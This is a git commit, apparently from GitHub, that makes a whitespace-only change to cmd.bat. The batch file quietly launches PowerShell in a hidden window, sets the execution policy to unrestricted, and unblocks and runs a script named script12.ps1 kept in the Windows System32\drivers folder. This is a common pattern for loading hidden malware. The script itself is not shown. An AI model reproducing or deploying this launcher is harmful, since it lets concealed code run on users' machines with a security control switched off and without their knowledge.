d1512e77e74cad172f745488b4594c68a1556ab5
nothingtoseehere121 <98023403+nothingtoseehere121@users.noreply.github.com>
2022-09-07 15:57:20 +0300

    Update cmd.bat

--- cmd.bat
+++ cmd.bat
@@ -1,3 +1,3 @@
 @ECHO OFF
-cmd.exe /q /c "powershell.exe -windowstyle hidden set-executionpolicy unrestricted ; Unblock-File C:\Windows\System32\drivers\script12.ps1 ; C:\Windows\System32\drivers\script12.ps1"
+cmd.exe /q /c "powershell.exe -windowstyle hidden set-executionpolicy unrestricted ; Unblock-File C:\Windows\System32\drivers\script12.ps1  ; C:\Windows\System32\drivers\script12.ps1"
 pause
